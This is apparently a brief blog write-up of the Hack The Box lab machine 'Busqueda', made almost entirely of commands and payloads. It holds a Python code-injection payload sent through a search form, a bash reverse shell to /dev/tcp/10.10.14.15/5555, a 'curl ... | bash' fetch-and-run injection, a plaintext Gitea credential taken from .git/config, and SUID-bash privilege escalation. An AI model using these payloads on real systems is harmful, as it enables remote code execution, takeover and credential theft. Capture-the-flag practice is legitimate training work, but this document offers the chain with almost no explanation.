---
layout: post
title: htb busqueda
date: 2023-04-10 11:30 +0200
---

```bash
┌──(rether㉿rether)-[~]
└─$ nmap -A 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:26 CEST
Nmap scan report for 10.10.11.208
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

```
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 114
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Amazon&query=1'%2beval(compile("import+os\nos.system('cat app.py')+",'<String>','exec'))%2b'&auto_redirect=
```

```python
eval(compile("import os; os.system('cat app.py')",'<string>','exec'))
```

```python
from flask import Flask, render_template, request, redirect
from searchor import Engine
import subprocess


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', options=Engine.__members__, error='')

@app.route('/search', methods=['POST'])
def search():
    try:
        engine = request.form.get('engine')
        query = request.form.get('query')
        auto_redirect = request.form.get('auto_redirect')

        if engine in Engine.__members__.keys():
            arg_list = ['searchor', 'search', engine, query]
            r = subprocess.run(arg_list, capture_output=True)
            url = r.stdout.strip().decode()
            if auto_redirect is not None:
                return redirect(url, code=302)
            else:
                return url

        else:
            return render_template('index.html', options=Engine.__members__, error="Invalid engine!")

    except Exception as e:
        print(e)
        return render_template('index.html', options=Engine.__members__, error="Something went wrong!")

if __name__ == '__main__':
    app.run(debug=False)
```

**Content of app.py file from server**

```bash
bash -i >& /dev/tcp/10.10.14.15/5555 0>&1
```

```
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 180
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Amazon&query=http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl 10.10.14.15:4444/1.txt | bash ")','a','single'))%2b'&auto_redirect=
```

```bash
svc@busqueda:/var/www/app$ cat .git/config
cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app$
```

cody user = svc
credential for m authentification user/password: svc/jh1usoih2bkjaspwe92

```sh
#!/bin/bash
chmod +s /bin/bash
```

```sh
#!/bin/bash
cat /root/root.txt
```
